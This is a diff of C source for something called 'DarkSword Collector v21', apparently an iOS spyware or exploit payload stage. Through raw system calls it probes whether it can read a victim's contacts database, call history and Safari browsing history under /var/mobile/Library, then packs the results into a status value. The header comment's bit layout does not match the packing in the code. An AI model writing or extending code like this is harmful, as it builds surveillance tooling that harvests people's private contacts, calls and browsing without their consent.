@@ -1,6 +1,9 @@
 /**
- * DarkSword Collector v20 - Read AddressBook first 4 bytes
- * If SQLite: return 0x53716C69 = "Sqli"
+ * DarkSword Collector v21 - Read AddressBook first byte (v19 method)
+ * bits 0-7: first byte of AddressBook (0 if unreadable)
+ * bits 8-9: status (00=denied, 01=open_only, 11=read_ok)
+ * bits 16-23: first byte of CallHistory
+ * bits 24-25: status
  */
 
 static long _svc1(long n, long a) {
@@ -29,15 +32,22 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_read  3
 #define SYS_close 6
 
-int ds_start(void) {
-    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Library/AddressBook/AddressBook.sqlitedb", 0);
-    if (fd < 0) return 0xdead0000;
-    
-    unsigned char buf[4] = {0};
-    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
+/* Read first byte, return (byte << 8) | status */
+static int _read1(const char *path) {
+    int fd = (int)_svc2(SYS_open, (long)path, 0);
+    if (fd < 0) return 0;  /* denied */
+    unsigned char b = 0;
+    int n = (int)_svc3(SYS_read, fd, (long)&b, 1);
     _svc1(SYS_close, fd);
-    
-    if (n < 4) return 0xbeef0000 | (n & 0xFFFF);
-    
-    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
+    if (n > 0) return ((int)b << 8) | 3;  /* read_ok + byte */
+    return 1;  /* open_only */
+}
+
+int ds_start(void) {
+    int addr = _read1("/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
+    int call = _read1("/var/mobile/Library/CallHistoryDB/CallHistory.storedata");
+    int hist = _read1("/var/mobile/Library/Safari/History.db");
+
+    /* Pack: addr in bits 0-9, call in bits 10-19, hist in bits 20-29 */
+    return (addr & 0x3FF) | ((call & 0x3FF) << 10) | ((hist & 0x3FF) << 20);
 }
